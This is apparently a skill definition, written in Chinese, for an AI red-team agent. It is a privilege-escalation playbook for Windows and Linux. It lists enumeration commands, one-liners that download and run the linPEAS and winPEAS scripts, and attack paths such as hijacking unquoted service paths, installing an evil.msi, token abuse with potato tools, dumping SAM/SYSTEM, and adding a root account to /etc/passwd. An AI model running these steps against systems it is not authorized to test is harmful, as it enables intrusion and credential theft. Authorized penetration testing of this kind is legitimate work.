---
name: privesc
description: Windows / Linux 本地提权：信息收集清单、常见配置缺陷、内核与驱动、服务与计划任务、令牌与 SUID
whenToUse: 已拿到低权限 shell / 命令执行，需要提权到 SYSTEM / root
role: exploit
enabled: true
---

# 提权

## 先收集（30 秒版）

```powershell
# Windows
whoami /priv; whoami /groups; systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v /i "c:\\windows"
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
net localgroup administrators
```

```bash
# Linux
id; sudo -l; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
ps aux | grep -v '\[' | head -40
```

## 一键脚本（先跑再手工确认）

```bash
# Linux
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && sh /tmp/lp.sh -a
# Windows
IEX (New-Object Net.WebClient).DownloadString('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe')
```

## Windows 高频路径

```
1. 服务路径未加引号 + 可写目录：C:\Program Files\Vuln App\svc.exe → 放 C:\Program.exe
2. 服务二进制/目录可写 → 直接替换，sc stop/start
3. 未加引号的计划任务 + 可写目录
4. AlwaysInstallElevated=1 → msiexec /i evil.msi
5. 令牌：whoami /priv 有 SeImpersonate → 土豆系列（GodPotato / PrintSpoofer）
6. 备份操作员组 → 备份 SAM/SYSTEM 后离线解
7. 自动登录明文：reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
8. DLL 劫持：Process Monitor 看 NAME NOT FOUND
```

SeImpersonate 一行：

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```

## Linux 高频路径

```
1. sudo -l 里有 NOPASSWD 的编辑器/解释器 → GTFOBins 查对应逃逸
2. SUID 二进制 → GTFOBins
3. 可写 /etc/passwd → 直接加 root 账号
4. cron 里可写脚本 / PATH 劫持
5. capabilities：cap_setuid+ep 的 python/perl
6. 内核 exp：只在 version 明确匹配时用，先看 uname -r 与发行版补丁级别
7. docker 组 / socket 挂载 → docker run -v /:/mnt
```

## 判据

- 提权成功 = 新身份能读到原本读不到的东西（SAM / shadow / 其他用户家目录），不只是 `whoami` 变了
- 内核 exp 有蓝屏风险：先确认可回滚（快照/隔离环境），生产上不首选
- 落 `redteam_evidence_record`，附提权前后 `whoami` + 一条越权读取命令的输出
